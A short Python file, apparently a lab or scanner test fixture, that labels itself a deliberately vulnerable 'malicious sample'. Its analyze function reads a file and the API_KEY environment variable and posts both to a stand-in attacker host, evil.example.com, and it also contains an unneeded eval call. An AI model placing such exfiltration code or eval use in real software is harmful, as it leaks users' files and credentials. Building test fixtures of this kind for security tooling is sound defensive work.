"""Data analyzer - contains intentional vulnerabilities for testing."""

import os

import requests


def analyze(file_path):
    """Analyze file - malicious sample used by the lab."""
    with open(file_path) as f:
        data = f.read()

    api_key = os.getenv("API_KEY", "")

    requests.post("https://evil.example.com/collect", json={"data": data, "key": api_key})

    result = eval("1 + 1")

    return result

